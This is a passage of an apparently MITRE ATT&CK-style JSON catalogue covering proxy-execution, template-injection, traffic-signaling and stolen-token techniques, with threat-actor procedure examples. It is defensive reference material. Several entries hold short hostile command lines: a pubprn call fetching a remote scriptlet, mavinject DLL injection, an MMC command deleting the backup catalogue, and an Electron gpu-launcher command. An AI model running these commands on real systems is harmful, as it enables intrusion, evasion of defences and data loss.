"description": "Rundll32.exe is used as a way of executing Flame at the command-line."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has used rundll32 for execution."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use rundll32 for execution of its components."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group malware has used rundll32 to launch additional malicious components."}, {"id": "S0032", "name": "gh0st RAT", "description": "A gh0st RAT variant has used rundll32 for execution."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM)."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used rundll32 to load malicious DLLs."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has the ability to create a new process using rundll32."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can use rundll32.exe to gain execution."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used rundll32.exe to execute the IcedID loader."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used rundll32.exe for execution."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT is executed using rundll32.exe."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used rundll32.exe to execute malicious scripts and malware on a victim's network."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can use Rundll32 to execute additional payloads."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used Rundll32 to execute its loader for privilege escalation purposes."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs uses rundll32.exe in a Registry value added to establish persistence."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can use rundll32.exe to execute downloaded DLLs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used rundll32 to execute malicious payloads on a compromised host."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used rundll32.exe to execute Koadic stagers."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has used rundll32.exe to load a DLL for file encryption."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu uses RunDLL32 for execution via its injector DLL."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can use rundll32.exe for execution."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll."}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone has used rundll32 to execute a malicious DLL."}, {"id": "S1100", "name": "Ninja", "description": "Ninja loader components can be executed through rundll32.exe."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI has used rundll32 for execution."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group executed malware with C:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors used rundll32.exe to execute malicious installers."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has used rundll32.exe for execution."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can be executed using rundll32.exe."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke uses rundll32.exe to load."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka uses rundll32.exe to load its DLL."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon executes functions using rundll32.exe."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can load a DLL using Rundll32."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has used Rundll32.exe to drop malicious DLLs including Brute Ratel C4 and to enable C2 communication."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used rundll32.exe to execute components of VirtualBox."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses rundll32 execution without any command line parameters to contact command and control infrastructure, such as IP addresses associated with Tor nodes."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used rundll32.exe to execute malicious files."}, {"id": "S0148", "name": "RTM", "description": "RTM runs its core DLL file using rundll32.exe."}, {"id": "S0074", "name": "Sakula", "description": "Sakula calls cmd.exe to run various DLL files via rundll32."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has used rundll32.exe to execute DLLs."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper contains a module for downloading and executing DLLs that leverages rundll32.exe."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has executed downloaded DLLs with rundll32.exe."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used Rundll32.exe to execute payloads."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has been executed using rundll32.exe."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx uses rundll32 to call an exported function."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST used Rundll32 to execute payloads."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has used rundll32.exe for execution."}, {"id": "G0092", "name": "TA505", "description": "TA505 has leveraged rundll32.exe to execute malicious DLLs."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used rundll32.exe to load malicious DLLs."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can execute rundll32.exe in memory to avoid detection."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution utilizes rundll32.exe to execute the final Pikabot payload, using the named exports Crash or Limit depending on the variant."}, {"id": "S0141", "name": "Winnti for Windows", "description": "The Winnti for Windows installer loads a DLL using rundll32."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has utilized rundll32.exe to deploy ransomware commands with the use of WebDAV."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has used rundll32.exe to execute other DLLs and named pipes."}]}, {"name": "Verclsid", "description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.", "detailed_description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.", "id": "T1218.012", "examples": [{"id": "S0499", "name": "Hancitor", "description": "Hancitor has used verclsid.exe to download and execute a malicious script."}]}, {"name": "Mavinject", "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).", "detailed_description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.\nIn addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its  /HMODULE command-line parameter (ex. mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.", "id": "T1218.013", "examples": []}, {"name": "MMC", "description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.", "detailed_description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.\nFor example, mmc C:\\Users\\foo\\admintools.msc /a will open a custom, saved console msc file in author mode. Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window.\nAdversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems).\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the \"Link to Web Address\" snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\\path\\to\\test.msc.", "id": "T1218.014", "examples": []}, {"name": "Electron Applications", "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.", "detailed_description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code.\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of teams.exe and chrome.exe may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe).\nAdversaries may also execute malicious content by planting malicious JavaScript within Electron applications.", "id": "T1218.015", "examples": []}]}, {"name": "System Script Proxy Execution", "description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.", "detailed_description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.", "id": "T1216", "examples": [], "sub_techniques": [{"name": "PubPrn", "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.", "detailed_description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\nIn later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).", "id": "T1216.001", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses."}]}, {"name": "SyncAppvPublishingServer", "description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.", "detailed_description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.\nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from \\System32 through the command line via wscript.exe.\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" Proxying execution may function as a trusted/signed alternative to directly invoking powershell.exe.\nFor example,  PowerShell commands may be invoked using:\nSyncAppvPublishingServer.vbs \"n; {PowerShell}\"", "id": "T1216.002", "examples": []}]}, {"name": "Template Injection", "description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.", "detailed_description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.\nAdversaries may also modify the *\\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.", "id": "T1221", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. "}, {"id": "S0631", "name": "Chaes", "description": "Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit."}, {"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems."}, {"id": "G0100", "name": "Inception", "description": "Inception has used decoy documents to load malicious remote payloads via HTTP."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has been install via template injection through a malicious DLL embedded within a template RTF in a Word document."}], "sub_techniques": []}, {"name": "Traffic Signaling", "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.", "detailed_description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.", "id": "T1205", "examples": [{"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can modify the DSUserAgentCap.pm Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests."}, {"id": "S0220", "name": "Chaos", "description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the /tmp/clientsDownload.sock socket."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command."}, {"id": "S0587", "name": "Penquin", "description": "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement."}, {"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can identify a specific string in intercepted network traffic, SSH-2.0-OpenSSH_0.3xx., to trigger its command functionality."}], "sub_techniques": [{"name": "Port Knocking", "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.", "detailed_description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.", "id": "T1205.001", "examples": [{"id": "S1060", "name": "Mafalda", "description": "Mafalda can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports."}]}, {"name": "Socket Filters", "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.", "detailed_description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\nFilters can be installed on any Unix-like platform with libpcap installed or on Windows hosts using Winpcap.  Adversaries may use either libpcap with pcap_setfilter or the standard library function setsockopt with SO_ATTACH_FILTER options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.", "id": "T1205.002", "examples": [{"id": "S1161", "name": "BPFDoor", "description": "BPFDoor uses BPF bytecode to attach a filter to a network socket to view ICMP, UDP, or TCP packets coming through ports 22 (ssh), 80 (http), and 443 (https). When BPFDoor  finds a packet containing its \"magic\" bytes, it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields."}, {"id": "S0587", "name": "Penquin", "description": "Penquin installs a TCP and UDP filter on the eth0 interface."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at /data/runtime/cockpit/wd.fd for a predefined magic byte sequence. PITSTOP can then duplicate the socket for further communication over TLS."}]}]}, {"name": "Trusted Developer Utilities Proxy Execution", "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.", "detailed_description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.", "id": "T1127", "examples": [], "sub_techniques": [{"name": "MSBuild", "description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.", "detailed_description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.", "id": "T1127.001", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can use built-in modules to abuse trusted utilities like MSBuild.exe."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used MSbuild to execute an actor-created file."}, {"id": "S0013", "name": "PlugX", "description": "A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques."}]}, {"name": "ClickOnce", "description": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility. ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.", "detailed_description": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility. ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.\nBecause ClickOnce applications receive only limited permissions, they do not require administrative permissions to install. As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.\nClickOnce may be abused in a number of ways. For example, an adversary may rely on User Execution. When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.\nAdversaries may also abuse ClickOnce to execute malware via a Rundll32 script using the command rundll32.exe dfshim.dll,ShOpenVerbApplication1.\nAdditionally, an adversary can move the ClickOnce application file to a remote user\u2019s startup folder for continued malicious code deployment (i.e., Registry Run Keys / Startup Folder).", "id": "T1127.002", "examples": []}]}, {"name": "Unused/Unsupported Cloud Regions", "description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.", "detailed_description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.", "id": "T1535", "examples": [], "sub_techniques": []}, {"name": "Use Alternate Authentication Material", "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.", "detailed_description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.", "id": "T1550", "examples": [{"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can allow abuse of a compromised AD FS server's SAML token."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services."}], "sub_techniques": [{"name": "Application Access Token", "description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.", "detailed_description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\nFor example, with a cloud-based email service, 